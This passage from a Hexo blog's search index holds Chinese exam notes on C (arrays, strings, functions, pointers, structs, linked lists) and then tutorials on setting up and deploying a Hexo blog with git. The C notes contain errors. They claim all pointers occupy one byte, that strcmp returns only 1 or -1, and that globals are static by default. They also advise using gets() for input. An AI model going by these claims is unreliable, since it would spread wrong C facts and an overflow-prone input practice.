错误的原因初始化数组超过了数组本身的大小 return 0;&#125; 常见错误3： 12345# include &lt;stdio.h&gt;int main() &#123; int a[5] = &#123;&#125;;// 初始化大括号里面不能什么都不填 return 0;&#125; 二维数组二维数组在逻辑上是数组的数组，即二维数组的每个元素是一个一维数组（一行），在物理上是一维数组，即所有的元素都是连续存储的。从直观上来看，二维数组就是线性代数中的矩阵。 语法： 1类型说明符 数组名[正整数常量表达式1][正整数常量表达式2]; 例如： 1int a[3][4]; 在这个定义的二维数组中，共包含3 * 4个元素，即12个元素。接下来，通过一张图来观察二维数组a的元素分布情况，如图所示： 通过另一张图来观察二维数组a的逻辑结构和存储结构： 同一维数组类似，对数组元素的访问也是用下标，指定行下标（常量表达式）和列下标（常量表达式），行下标和列下标都是从0开始的： 123a[0][0]; //为0行0列元素，注意与习惯上区分开，习惯上的第1对应下标0a[2][1]; //为2行1列元素a[1][1+2]; //为1行3列元素 二维数组的初始化： 先定义，后赋值，在显式赋值之前，二维数组的各数据元素是随机值（不确定）。 123456789// 先定义int a[2][3];// 后赋初值a[0][0]=1;a[0][1]=2;a[0][2]=3;a[1][0]=4;a[1][1]=5;a[1][2]=6; 在定义二维数组的同时，采用初始化列表的形式对其元素赋初值。 12345678910111213141516171819202122232425// 分行给出初始化数据，且每行的初始化数据个数等于列数，这一行代码相当于上面的七行代码int a[2][3]=&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;&#125;;// 由于初始化列表中明确给出了两行数据，故定义该数组时，其第一维的大小可省略，编译器能间接算出该数组的行数为 2，故依然可以确定其空间大小，因此，在对二维数组进行初始化时，其第一维的大小可以省略，即写成如下形式：// int a[][3]=&#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;&#125;;// 等价于不分行写法，前提是 数组元素的个数（行数 × 列数）= 大括号后面的初始值个数// int a[2][3]=&#123;l,2,3,4,5,6&#125;;// 同样可以省略第一维的大小// int a[][3]=&#123;l,2,3,4,5,6&#125;;// 如果数组元素的个数（行数 × 列数）不等于 大括号后面的初始值个数// int a[][3]=&#123;l,2,3,4,5,6,7&#125;;// 这就相当于// int a[3][3] = &#123;l,2,3,4,5,6,7,0,0&#125;; // 第一维大小可省略// 也相当于// int a[3][3] = &#123;l,2,3,4,5,6,7,0&#125;; // 第一维大小可省略// 还相当于// int a[3][3] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;,&#123;7,0,0&#125;&#125;; // 第一维大小可省略// 同时相当于// int a[3][3] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;,&#123;7&#125;&#125;; // 第一维大小可省略// 最后，还可以相当于先定义，后赋值的形式，这里省略相关代码// 注：某行一行初始值如未写全，那么该行元素，后面的元素会自动被赋予初值0 二维数组初始化常见错误 1234int a[2][] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;&#125;; //错误。不能省略第二维大小int a[][] = &#123;&#123;l,2,3&#125;, &#123;4,5,6&#125;&#125;; //错误。不能省略第二维大小int a[][3]; //错误。没有提供初始化列表时，两维的大小都必须显式给出int a[2][3] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;,&#123;7,8,9&#125;&#125;; //错误。初始行数多于数组行数 通常使用双层for循环，遍历二维数组 字符数组与字符串字符数组用来存放字符的数组称为字符数组。字符数组的各个元素依次存放字符串的各字符,字符数组的数组名代表该数组的首地址,这为处理字符串中个别字符和引用整个字符串提供了极大的方便。字符数组的定义形式与前面介绍的整型数组相同。 语法： 1char c[6]; 在定义时进行初始化赋值: 12// 长度可省略char c[6]=&#123;'c', ' h ', 'i', 'n', 'a' , '\0' &#125;; 先定义后赋值: 12char c[6];c[0]= 'c',c[1]= 'h',c[2]= 'i',c[3]= 'n',c[4]= 'a',c[5]= '\0'; 其中,‘\0’为字符串结束符。如果不对c[5]赋任何值,‘\0’会由编译器自动添加。 如果如果大括号里面的元素个数小于数组的长度，则只将大括号中的字符赋给数组中前面的元素，剩下的内存空间编译器会自动用 ‘\0’ 填充。 字符数组也可采用字符串常量的赋值方式,例如: 123char a[]=&#123;"china"&#125;;// 长度是6，因为最后还有一个结束符'\0'// 等价形式// char a[] = "china";/ 同理，长度是6 scanf %s输入字符数组时，不需要取地址，因为数组名本身就是地址常量。 12char a[10];scanf("%s",a);// scanf %s不能输入带有空格的字符串，会被截断，如果字符串中可能带有空格（回车，tab）字符，用gets函数输入 可以用for循环（其他循环也可以）加printf %c形式输出字符数组的内容，也可以直接用printf %s格式输出字符数组内容。 123456789char a[] = "china";// for循环加printf %c形式输出int i;for (i = 0;i &lt; sizeof(a);i++) &#123; printf("%c",a[i]);&#125;// 直接用printf %s格式输出字符数组printf("%s",a); 字符串C语言中没有字符串这种数据类型，但是可以通过char的数组来替代； 字符串一定是一个char的数组，但char的数组未必是字符串； 数字0(和字符‘\0’等价)结尾的char数组就是一个字符串，但如果char数组没有以数字0结尾，那么就不是一个字符串，只是普通字符数组，所以字符串是一种特殊的char的数组。 内存中字符串以字符数组的形式存在，而数组以指针常量（地址常量）的形式存在，即数组首地址是个很关键的因素。 正是由于数组都是以指针常量的形式存在，所以C语言没有办法对数组的大小进行检查，所以通常，数组越界错误编译器是不会指出来的，但是也有部分高级的编译器会指出warning。 字符串操作函数常用的字符串操作函数如下： 使用字符串操作函数注意事项： 使用前需要先引入头文件#include&lt;string.h&gt;； strlen()获取字符串的长度，在字符串长度中是不包括‘\0’而且汉字和字母的长度是不一样的； strcmp()在比较的时候会把字符串先转换成ASCII码再进行比较,返回的结果为0，表示s1和s2的ASCII码相等,返回结果为1，表示s1比s2的ASCII码大,返回结果为-1，表示s1比s2的ASCII码小； strcpy()拷贝之后会覆盖s1原来的字符串且s1不能是字符串常量； s，s1，s2均为字符指针类型（即可以传递的实参为字符指针，字符数组，字符串常量）。 第五模块 函数的使用考试大纲的要求（1）掌握函数的原型声明、调用及返回；（2）掌握函数参数；（3）理解变量存储特性。 笔记函数函数是学习 C 语言的重点。C 语言的主体和核心，一个是函数，另一个是指针。 简单来说，一个函数就是实现一个功能模块。 每个 C 程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。主函数main()的功能是程序入口。 函数声明告诉编译器函数的名称、返回类型和参数。函数定义提供函数的实际主体。 语法： 1234return_type function_name( parameter list )&#123; body of the function&#125; 在 C 语言中，函数由一个函数头和一个函数主体组成。下面列出一个函数的所有的组成部分： 返回类型：一个函数可以返回一个值。return_type 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是 void（即返回值为空，不返回任何值）。 函数名称：这是函数的实际名称。函数名和参数列表一起构成了函数签名。 参数：参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。 函数主体：函数主体包含一组定义函数执行任务的语句。 函数名必须满足标识符的规范。 实例： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;bool isLeapYear(int year);// 函数声明，函数功能是，判断传入的年份是不是闰年，如果是返回1（真），否则返回0（假）int main() &#123; int year; scanf("%d", &amp;year); if (isLeapYear(year)) &#123;// 这里的year是实参，因为这里在调用函数 printf("%d 是闰年", year); &#125; else &#123; printf("%d 不是闰年", year); &#125; return 0;&#125;bool isLeapYear(int year) &#123;// 函数头,bool是函数返回值类型，返回值通常用来控制程序逻辑走向，这里的year是函数参数，形参 // 下面是函数体 if (year % 4 == 0 &amp;&amp; year % 100 != 0) &#123; return 1; &#125; if (year % 100 == 0 &amp;&amp; year % 400 == 0) &#123; return 1; &#125; return 0;&#125; 递归函数一个函数总会在某种情况下调用它本身，这样的函数叫递归函数，递归函数通常可以把问题简化，但是初学者难以理解。 递归函数设计的两个原则： 把大问题转换为子问题（找递推关系式） 递归出口 比如：要求10的阶乘，10的阶乘不好求，因为规模太大了，那我们就想，如果数据规模小一点，变成9的阶乘呢？会不会好求一点呢，然后9的阶乘也不好求，规模还是太大了，那8的阶乘呢？以此类推，最后到1的阶乘，就很好办了，1的阶乘就是1，这就到了递归出口了，这个时候再倒回去，把10的阶乘求出来 代码实现： 1234567891011121314#include &lt;stdio.h&gt;int fac(int n);int main() &#123; printf("%d",fac(5));// 大于等于15的阶乘会溢出 return 0;&#125;int fac(int n) &#123; if (n &lt;= 1) &#123;// 递归出口 return 1; &#125; return n * fac(n - 1);// 递推关系式&#125; 变量存储特性局部变量定义在函数体内部的变量（函数的形参也是局部变量），就是局部变量，每次调用函数局部变量都会被初始化，每次离开函数，局部变量就被销毁，回收空间。 局部变量的作用范围是从定义的位置开始到函数体结束。 全局变量定义在函数体外部的变量，就是全局变量。 全局变量的作用范围是从定义的位置开始到本文件结束。 staticstatic 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。 static 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。 实例： 12345678910111213141516171819202122#include &lt;stdio.h&gt;/* 函数声明 */void func1(void);static int count = 10; /* 全局变量 - static 是默认的 */int main() &#123; while (count--) &#123; func1(); &#125; return 0;&#125;void func1(void) &#123;/* 'thingy' 是 'func1' 的局部变量 - 只初始化一次 * 每次调用函数 'func1' 'thingy' 值不会被重置。 */ static int thingy = 5; thingy++; printf(" thingy 为 %d ， count 为 %d\n", thingy, count);&#125; 输出结果： 12345678910thingy 为 6 ， count 为 9thingy 为 7 ， count 为 8thingy 为 8 ， count 为 7thingy 为 9 ， count 为 6thingy 为 10 ， count 为 5thingy 为 11 ， count 为 4thingy 为 12 ， count 为 3thingy 为 13 ， count 为 2thingy 为 14 ， count 为 1thingy 为 15 ， count 为 0 第六模块 指针的使用考试大纲的要求（1）理解指针的声明与初始化；（2）理解指针与数组；（3）理解字符串与指针。 笔记指针指针是学习 C 语言的另一个重点。C 语言的主体和核心，一个是函数，另一个是指针。 每一个变量都有一个内存位置，每一个内存位置都定义了 &amp; 运算符访问的地址，它表示了在内存中的一个地址。而指针的本质就是地址。 printf %p可以直接输出地址（也就是指针）。 指针变量是一个变量，其值为另一个变量的地址，即，内存位置的直接地址。就像使用其他变量或常量一样，必须在使用指针存储其他变量地址之前，对其进行声明。指针变量通常简称为指针。 语法： 1type *var-name; type 是指针的基类型，它必须是一个有效的 C 数据类型，var-name 是指针变量的名称。用来声明指针的星号 * 与乘法中使用的星号是相同的。但是，在这个语句中，星号是用来指定一个变量是指针。 1234int *ip; /* 一个整型的指针 */double *dp; /* 一个 double 型的指针 */float *fp; /* 一个浮点型的指针 */char *ch; /* 一个字符型的指针 */ 所有实际数据类型，不管是整型、浮点型、字符型，还是其他的数据类型（如：结构体类型），对应指针的值的类型都是一样的，都是一个代表内存地址的长的十六进制数（即：所有指针变量所占用的空间都是一个字节）。 不同数据类型的指针之间唯一的不同是，指针所指向的变量或常量的数据类型不同。 如何使用指针？使用指针时会频繁进行以下几个操作：定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值。这些是通过使用一元运算符 * 来返回位于操作数所指定地址的变量的值。下面的实例涉及到了这些操作： 123456789101112131415161718#include &lt;stdio.h&gt;int main() &#123; int var = 20; /* 实际变量的声明 */ int *ip; /* 指针变量的声明 */ ip = &amp;var; /* 在指针变量中存储 var 的地址 */ printf("Address of var variable: %p\n", &amp;var); /* 在指针变量中存储的地址 */ printf("Address stored in ip variable: %p\n", ip); /* 使用指针访问值 */ printf("Value of *ip variable: %d\n", *ip); return 0;&#125; 实例执行结果：不同终端（计算机）输出的地址值可能不同 123Address of var variable: 0x7fff7f351a94Address stored in ip variable: 0x7fff7f351a94Value of *ip variable: 20 C 中的 NULL 指针在变量声明的时候，如果没有确切的地址可以赋值，为指针变量赋一个 NULL 值是一个良好的编程习惯。赋为 NULL 值的指针被称为空指针。 NULL 指针是一个定义在标准库中的值为零的常量。有点类似字符串的结束符。 指针变量相关运算和相关概念 概念描述 指针的算术运算可以对指针进行四种算术运算：++（指向下一个位置）、--（指向上一个位置）、+（往后移）、-（往前移） 指针数组可以定义用来存储指针的数组。 指向指针的指针（双重指针）C 允许指向指针的指针。 传递指针给函数通过引用或地址传递参数，使传递的参数在调用函数中可以被改变。 从函数返回指针C 允许函数返回指针到局部变量、静态变量和动态内存分配。 指针与数组数组名就是地址常量（指针常量）。 字符串与字符指针字符串通常是字符数组。 1char name[] = "aaa"; 字符指针通常是指向字符型变量的指针，但C语言还支持直接使用一个字符指针指向字符串。 1char *str = "hello C language"; 字符数组和指向字符串的字符指针的差别： 一句话：字符数组存放在全局数据区或栈区，可读可写。指向字符串的字符指针所指向的字符串存放在常量区，只读不能写。 1234567char *str = "hello";str[1] = 'a';// 错误，尝试修改常量char *str2 = "world";str = str2;// 正确，str是指针变量，可以修改指针变量的指向char a[] = "hello world";a[0] = 'b';// 正确，字符数组的元素可读可写a = str2;// 错误，a为指针常量，不能修改指向的内存地址 第七模块 结构体考试大纲的要求（1）理解结构体变量；（2）了解结构体数组；（3）了解结构体与指针；（4）了解链表的使用。 笔记结构体C 数组允许定义可存储相同类型数据项的变量，结构体是 C 编程中另一种用户自定义的可用的数据类型，它允许存储不同类型的数据项。 结构体用于表示一条记录，比如学生成绩，一条学生成绩信息需要包括：学生姓名（字符数组）、学号（整型），数学成绩（单精度或双精度浮点型），英语成绩（单精度或双精度浮点型），C语言成绩（单精度或双精度浮点型），总分（单精度或双精度浮点型），平均分（单精度或双精度浮点型）。 语法：定义结构体，必须使用 struct 关键字 123456struct tag &#123; member-list member-list member-list ...&#125; variable-list ; tag 是结构体标识符（别名）。 member-list 是标准的变量定义，比如 int i; 或者 float f，或者其他有效的变量定义。 variable-list 结构变量，定义在结构的末尾，最后一个分号之前，您可以指定一个或多个结构变量。下面是声明 Score 结构的方式： 123456789struct Score &#123; int stu_num; char stu_name[10]; double math; double english; double c; double avg; double sum;&#125; someonedScore; 在一般情况下，tag、member-list、variable-list 这 3 部分至少要出现 2 个。以下为实例： 123456789101112131415161718192021222324252627//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c//同时又声明了结构体变量s1//这个结构体并没有标明其标签struct &#123; int a; char b; double c;&#125; s1;//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c//结构体的标签被命名为SIMPLE,没有声明变量struct SIMPLE &#123; int a; char b; double c;&#125;;//用SIMPLE标签的结构体，另外声明了变量t1、t2、t3（结构体指针）struct SIMPLE t1, t2[20], *t3;//也可以用typedef创建新类型，这个考纲没有要求，大概看看了解以下typedef struct &#123; int a; char b; double c;&#125; Simple2;//现在可以用Simple2作为类型声明新的结构体变量Simple2 u1, u2[20], *u3; 如果两个结构体互相包含，则需要对其中一个结构体进行不完整声明，如下所示： 12345678910111213struct B; //对结构体B进行不完整声明//结构体A中包含指向结构体B的指针struct A &#123; struct B *partner; //other members;&#125;;//结构体B中包含指向结构体A的指针，在A声明完后，B也随之进行声明struct B &#123; struct A *partner; //other members;&#125;; 结构体变量的初始化： 123456789101112#include &lt;stdio.h&gt;struct Books &#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125; book = &#123;"C 语言", "RUNOOB", "编程语言", 123456&#125;;int main() &#123; printf("title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n", book.title, book.author, book.subject, book.book_id);&#125; 访问结构体成员： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Books &#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;;int main() &#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy(Book1.title, "C Programming"); strcpy(Book1.author, "Nuha Ali"); strcpy(Book1.subject, "C Programming Tutorial"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy(Book2.title, "Telecom Billing"); strcpy(Book2.author, "Zara Ali"); strcpy(Book2.subject, "Telecom Billing Tutorial"); Book2.book_id = 6495700; /* 输出 Book1 信息 */ printf("Book 1 title : %s\n", Book1.title); printf("Book 1 author : %s\n", Book1.author); printf("Book 1 subject : %s\n", Book1.subject); printf("Book 1 book_id : %d\n", Book1.book_id); /* 输出 Book2 信息 */ printf("Book 2 title : %s\n", Book2.title); printf("Book 2 author : %s\n", Book2.author); printf("Book 2 subject : %s\n", Book2.subject); printf("Book 2 book_id : %d\n", Book2.book_id); return 0;&#125; 指向结构体的指针： 123struct Books *struct_pointer;// 声明指针变量struct_pointer = &amp;Book1;// 初始化指针struct_pointer-&gt;title;// 使用指向该结构的指针访问结构的成员 实例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Books &#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;;/* 函数声明 */void printBook(struct Books *book);int main() &#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy(Book1.title, "C Programming"); strcpy(Book1.author, "Nuha Ali"); strcpy(Book1.subject, "C Programming Tutorial"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy(Book2.title, "Telecom Billing"); strcpy(Book2.author, "Zara Ali"); strcpy(Book2.subject, "Telecom Billing Tutorial"); Book2.book_id = 6495700; /* 通过传 Book1 的地址来输出 Book1 信息 */ printBook(&amp;Book1); /* 通过传 Book2 的地址来输出 Book2 信息 */ printBook(&amp;Book2); return 0;&#125;void printBook(struct Books *book) &#123; printf("Book title : %s\n", book-&gt;title); printf("Book author : %s\n", book-&gt;author); printf("Book subject : %s\n", book-&gt;subject); printf("Book book_id : %d\n", book-&gt;book_id);&#125; 结构体数组： 本质上就是个数组，只不过数组中的元素变成了结构体变量，用法同数组一样，使用下标访问数组元素。 链表链表是一种常见的基础数据结构，结构体指针在这里得到了充分的利用。链表可以动态的进行存储分配，也就是说，链表是一个功能极为强大的数组，他可以在节点中定义多种数据类型，还可以根据需要随意增添，删除，插入节点。链表都有一个头指针，一般以head来表示，存放的是一个地址。链表中的节点分为两类，头结点和一般节点，头结点是没有数据域的。链表中每个节点都分为两部分，一个数据域，一个是指针域。说到这里你应该就明白了，链表就如同车链子一样，head指向第一个元素：第一个元素又指向第二个元素；……，直到最后一个元素，该元素不再指向其它元素，它称为“表尾”，它的地址部分放一个“NULL”（表示“空地址”），链表到此结束。 实例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct node &#123; int data; struct node *next;&#125; LinkList;LinkList *creat(int n) &#123; // 创建链表 LinkList *head, *node, *end;//定义头节点，普通节点，尾部节点； head = (LinkList *) malloc(sizeof(LinkList));//分配地址 end = head; //若是空链表则头尾节点一样 int i = 0; for (; i &lt; n; i++) &#123; node = (LinkList *) malloc(sizeof(LinkList)); scanf("%d", &amp;node-&gt;data); end-&gt;next = node; end = node; &#125; end-&gt;next = NULL;//结束创建 return head;&#125;void change(LinkList *list, int n) &#123;//修改链表中第n个节点的值 LinkList *t = list; int i = 0; while (i &lt; n &amp;&amp; t != NULL) &#123; t = t-&gt;next; i++; &#125; if (t != NULL) &#123; puts("输入要修改的值"); scanf("%d", &amp;t-&gt;data); &#125; else &#123; puts("节点不存在"); &#125;&#125;void delet(LinkList *list, int n) &#123;//删除链表中第n个节点 LinkList *t = list, *in; int i = 0; while (i &lt; n &amp;&amp; t != NULL) &#123; in = t; t = t-&gt;next; i++; &#125; if (t != NULL) &#123; in-&gt;next = t-&gt;next; free(t); &#125; else &#123; puts("节点不存在"); &#125;&#125;void insert(LinkList *list, int n) &#123;// 在链表中第n个节点之后插入一个节点 LinkList *t = list, *in; int i = 0; while (i &lt; n &amp;&amp; t != NULL) &#123; t = t-&gt;next; i++; &#125; if (t != NULL) &#123; in = (LinkList *) malloc(sizeof(LinkList)); puts("输入要插入的值"); scanf("%d", &amp;in-&gt;data); in-&gt;next = t-&gt;next;//填充in节点的指针域，也就是说把in的指针域指向t的下一个节点 t-&gt;next = in;//填充t节点的指针域，把t的指针域重新指向in &#125; else &#123; puts("节点不存在"); &#125;&#125;void print(LinkList *h) &#123;// 输出链表 while (h-&gt;next != NULL) &#123; h = h-&gt;next; printf("%d ", h-&gt;data); &#125; puts("");&#125;int main() &#123; puts("创建具有5个节点的链表"); LinkList *head = creat(5);// 创建具有5个节点的链表 puts("输出链表"); print(head);// 输出链表 puts("删除链表第3个节点"); delet(head,3);// 删除链表第3个节点 puts("输出删除链表第3个节点之后的链表"); print(head);// 输出删除链表第3个节点之后的链表 puts("在链表的第4个节点之后插入一个节点"); insert(head,4);// 在链表的第4个节点之后插入一个节点 puts("输出插入节点之后的链表"); print(head);// 输出插入节点之后的链表 puts("修改链表第2个节点的值"); change(head,2);// 修改第2个节点的值 puts("输出修改了第2个节点的值之后的链表"); print(head);// 输出修改了第2个节点的值之后的链表 return 0;&#125; 输出结果： 1234567891011121314151617创建具有5个节点的链表1 2 3 4 5输出链表1 2 3 4 5 删除链表第3个节点输出删除链表第3个节点之后的链表1 2 4 5 在链表的第4个节点之后插入一个节点输入要插入的值6输出插入节点之后的链表1 2 4 5 6 修改链表第2个节点的值输入要修改的值7输出修改了第2个节点的值之后的链表1 7 4 5 6 致谢 菜鸟教程——C语言教程 C语言入门教程 C语言中文网 C语言基础知识笔记 csdn大佬的博客]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用代码托管网站备份和发布个人博客]]></title>
    <url>%2Fposts%2F4555adf3%2F</url>
    <content type="text"><![CDATA[前言 在上一篇博客中，我已经教会了大家如何利用hexo搭建本地博客。 接下来我将教大家如何备份自己的博客到云端以实现多终端（多台电脑）写博客以及如何将本地博客发布（也叫部署）到公网——方便所有人查看和阅读。 问题：为什么需要备份和发布博客？ 因为有时候我们会遇到下面几个问题 1. 如果我想在另一台电脑写博客怎么办 2. 如果我换电脑了怎么办 3. 如果我有好多台不同操作系统的电脑都需要写博客怎么办 4. 如果我想把我的博客文章分享给其他人看，怎么办 为了处理好以上这些问题，我们需要将博客备份起来并且托管到公网服务器便于查看 解决问题思路 利用git仓库的分支管理实现备份博客和发布网站——备份的文件包括主题，配置以及博客原文（xxx.md）等具体： 主题和配置以及博客原文等放在master分支 生成的静态网站等放在website分支 每次修改了博客都要干两件事 发布静态网站（借助hexo插件推送到website分支）hexo clean &amp;&amp; hexo d 备份到git仓库（使用git命令推送到master分支）git add .git commit-m &quot;这里填提交信息&quot;git push 环境准备 1. hexo博客依赖环境，nodejs和git工具已经安装好了，如果没有安装好，请移步上篇博客 2. 拥有coding或者其他代管托管平台（如github，gitee等）账号，如果没有，请移步注册 说明 本文以coding为例，其他托管平台操作类似 配置 ssh 公钥访问 git 仓库参考官方帮助文档，操作步骤很详细，不再赘述 创建仓库 打开浏览器，登陆coding网站 右上角通知图标旁边，有个项目图标，鼠标放上去会自动弹出菜单，选择新建项目，如图 在打开的网页中，输入项目名称（我这里叫blog），项目描述等，选择git仓库 打开你的blog项目，选择左边菜单处的代码仓库–&gt;代码浏览，然后选择右边的ssh，点击后面的按钮，将ssh链接复制到剪切板 找一个目录，右键Git Bash Here（Linux选在此处打开终端），输入命令git clone 刚才复制的ssh链接，完成后这个目录下会多一个blog文件夹 进入blog文件夹，将上篇博客中创建的本地博客文件夹里面的内容全部复制到刚才的文件夹下 在blog文件夹下，新建.gitignore文件，可以使用命令touch .gitignore（注意，该文件不是文本文件，但可以用文本文件编辑器操作），内容如下 12345678.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/.idea/ 使用以下命令推送到到远端仓库 1234567git config --global user.name "这里填你的名称" # 如果配置过，可跳过git config --global user.email "这里填你的名称" # 如果配置过，可跳过git pullgit statusgit add .git commit -m "这里填提示信息"git push 新建分支 回到浏览器，登陆coding，然后选择左边菜单处的代码仓库–&gt;分支管理 点击右侧的新建分支 在弹出的页面输入website，点击创建分支 配置hexo 用文本编辑器（notepad++等），打开项目的_config.yml文件，先用 Ctrl + F，搜索deploy，然后修改参数如下 1234deploy: - type: git repo: ssh地址 # 仓库的ssh地址 branch: website # 要推送到的分支 安装插件，使用如下命令 1npm install hexo-deployer-git --save 发布静态网站 回到浏览器，登陆coding，然后选择左边菜单处的持续部署–&gt;静态网站 点击新建，输入相关信息，注意选择推送到“website”分支时触发构建，点击保存 保存后会得到一个url地址，类似下面框出来的那个 打开之前的blog文件夹，鼠标右键，选择Git Bash Here，输入命令hexo clean &amp;&amp; hexo d，稍等一会儿，不出意外的话，你就可以通过上面得到的url访问你的博客了，enjoy it! 绑定个人的二级域名 可以看到，上面默认分配给我们的url非常不具有可读性，压根没有办法记忆，于是我们产生了另外一个需求，绑定一个适合记忆的域名，方便我们访问我们自己的博客 这里假设我们已经有了自己的域名并且已经备案 在域名控制台里面，加一条二级域名解析，主机记录就是二级域名，类型选CNAME，记录值就是之前得到的url 在coding的静态网站部署页面绑定二级域名 通过浏览器访问二级域名测试，不一定立即成功，解析有延迟 多终端写博客 如果需要在新的终端（电脑）写博客，或者之前的系统崩溃了，需要恢复博客，请看以下操作步骤 在终端上配置nodejs，移步上篇博客 安装hexo，执行命令npm install -g hexo-cli 克隆备份好的博客仓库到本地，执行命令git clone ssh仓库地址，使用前需配置ssh公钥 进入刚才克隆下来的项目目录，安装npm依赖，执行命令npm install 写博客，发布，同以前一样 注意（多次强调） 每次修改了博客都要干两件事 1. 发布静态网站（借助hexo插件推送到website分支） hexo clean &amp;&amp; hexo d 2. 备份源文件等到git仓库（使用git命令推送到master分支） git add . git commit-m &quot;这里填提交信息&quot; git push每次在新的终端上写博客都要做的事 如果没有依赖环境，请先安装nodejs，hexo等依赖环境，如果有，别忘了先同步修改到本地，否则极有可能产生冲突，同步命令 git pull]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>个人博客</tag>
        <tag>代码托管</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用hexo搭建属于自己的博客]]></title>
    <url>%2Fposts%2Faf001b50%2F</url>
    <content type="text"><![CDATA[前言 随着计算机的发展，拥有一个属于自己的博客，是一件非常平常的事。而使用hexo框架搭建个人博客网站是比较流行的方式，因为它简单，快速，高效，且有很多炫酷的特效和方便的自定义，最重要的是它完全免费（更多hexo详细介绍，请参考hexo官网）。 接下来我将带领大家一起搭建自己的博客。后续还将带领大家完成个人博客的各种自定义特效，以及功能增强，包括发布到公网，备份博客，多终端写博客等等。想提前看看效果的亲们，请移步我的个人博客。 环境准备 windows下：nodejs: 点击跳转至下载页，直接下载最新的版本安装即可git: 点击跳转至下载页，直接下载最新的版本安装即可注：安装过程一路默认即可 Linux下：请看这篇文章 验证环境打开cmd窗口，输入命令 123git --versionnode -vnpm -v 如果出现，类似如下图所示，说明环境正确 安装hexo直接打开cmd，输入命令 12npm install -g cnpm --registry=https://registry.npm.taobao.org #使用淘宝镜像，国内速度会比较快npm install hexo-cli -g #安装hexo 搭建个人博客 找个空的文件夹，或者新建一个文件夹，命名为blog 进入blog文件夹、然后鼠标右键，选择Git Bash Here 初始化博客，使用命令 1hexo init 等待hexo初始化完成，这个过程可能会比较慢，因为需要从国外的网站上下载很多东西。当你看到下图红色方框中的提示信息，就代表初始化完成了。 启动博客 1hexo s 打开浏览器，在地址栏输入http://localhost:4000，即可访问到搭建好的本地博客啦，enjoy it!]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>个人博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fposts%2F4a17b156%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
